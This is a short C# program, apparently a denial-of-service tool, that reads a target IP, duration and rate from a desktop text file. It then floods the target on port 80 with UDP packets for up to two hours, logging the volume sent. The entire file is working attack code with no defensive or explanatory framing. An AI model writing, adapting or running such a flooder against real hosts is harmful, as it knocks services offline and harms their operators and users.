using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using System.Reflection;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.ComponentModel;

class Syn

{
    static DateTime start = DateTime.Now;

    //Packages send before console logging status
    static int loggingTime = 5084;
    static int total = 0;
    static int per = 0;
    //Higher the amount = slower
    static int speed = 12;
    static string p = "1234567890123456789012345678901234567890";
    static string data = (p + p + p + p + p + p + p + p + p + p);
    static byte[] dataBytes = System.Text.ASCIIEncoding.ASCII.GetBytes(data);

    static string username = Environment.UserName;

    static string[] lines = System.IO.File.ReadAllLines(@"C:\Users\" + username + @"\Desktop\ip-port.txt");

    //Define IP, Port and Time
    static string targetIP = lines[0];
    static int port = 80;
    static int totalTime = 0;


    static void Main(string[] args)
    {
        startSending();
    }

    public static void startSending()
    {

        try
        {
            totalTime = int.Parse(lines[1]);
        }
        catch (Exception e)
        {
            totalTime = 2147483646;
        }
        if (totalTime > 2 * 60 * 60) totalTime = 2 * 60 * 60;

        IPEndPoint ep = new IPEndPoint(IPAddress.Parse(targetIP), port);

        try
        {
            speed = int.Parse(lines[2]);
        }
        catch (Exception e)
        {

        }

        Console.WriteLine("Speed: " + speed);
        Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
        client.SendTimeout = 100000;

        Console.WriteLine("ip+" + targetIP + "\n time:" + totalTime);
        Console.WriteLine("Sended " + Math.Round(total * data.Length / 1024 / 102.4 * 10) / 100 + " \t MB");

        int logDataCounter = 0;
        while (true)
        {
            per++;
            if (per > speed)
            {
                System.Threading.Thread.Sleep(10);
                per = 0;
            }
            if ((DateTime.Now - start).TotalSeconds >= totalTime)
                break;
            total++;
            logDataCounter++;
            client.SendTo(dataBytes, ep);
            if (logDataCounter >= loggingTime)
            {
                logDataCounter = 0;
                Console.WriteLine("Sended " + Math.Round(total * data.Length / 1024 / 102.4 * 10) / 100 + " \t MB");
            }
        }

    }
}